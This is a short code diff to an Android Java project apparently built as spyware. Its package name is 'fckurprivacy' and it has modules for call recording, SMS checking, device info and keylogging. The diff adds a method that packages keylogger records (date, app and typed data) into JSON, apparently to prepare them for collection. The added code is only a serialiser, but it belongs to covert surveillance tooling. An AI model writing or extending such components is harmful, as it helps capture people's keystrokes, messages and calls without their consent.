@@ -3,6 +3,7 @@ package com.vergermiya.harevost.fckurprivacy.Util;
 import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecord;
 import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecordJSon;
 import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
+import com.vergermiya.harevost.fckurprivacy.KeyLogger.KeyLogJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
 
 import org.json.JSONArray;
@@ -94,6 +95,23 @@ public class JsonBuilder {
             jsonArray.put(jsonText);
         }
         return jsonArray;
+    }
+
+    public static JSONStringer buildKeyLogJson(KeyLogJson keyLogJson) {
+        JSONStringer jsonText = new JSONStringer();
+        try {
+            jsonText.object();
+
+            jsonText.key("Date").value(keyLogJson.getLogDate());
+            jsonText.key("App").value(keyLogJson.getLogApp());
+            jsonText.key("Data").value(keyLogJson.getLogData());
+
+            jsonText.endObject();
+
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        return jsonText;
     }
 }
 
